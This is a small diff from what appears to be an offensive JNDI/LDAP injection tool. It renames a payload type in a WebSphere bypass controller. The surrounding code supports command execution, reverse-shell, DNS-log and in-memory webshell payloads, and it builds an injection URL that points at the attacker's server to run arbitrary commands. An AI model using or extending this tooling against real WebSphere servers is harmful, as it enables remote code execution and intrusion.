@@ -93,7 +93,7 @@ public class WebsphereBypassController implements LdapController {
                     try{
                         payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                         // webspherebypass 只支持这 4 种类型的 PayloadType
-                        if(payloadType != PayloadType.qi4l && payloadType != PayloadType.dnslog
+                        if(payloadType != PayloadType.command && payloadType != PayloadType.dnslog
                                 && payloadType != PayloadType.reverseshell && payloadType != PayloadType.webspherememshell){
                             throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + payloadType);
                         }
@@ -103,7 +103,7 @@ public class WebsphereBypassController implements LdapController {
 
                     System.out.println( ansi().render("@|green [+]|@ @|MAGENTA PayloadType >> |@" + payloadType));
                     switch (payloadType){
-                        case qi4l:
+                        case command:
                             String cmd = Util.getCmdFromBase(base);
                             System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                             injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=command&cmd=" + cmd;
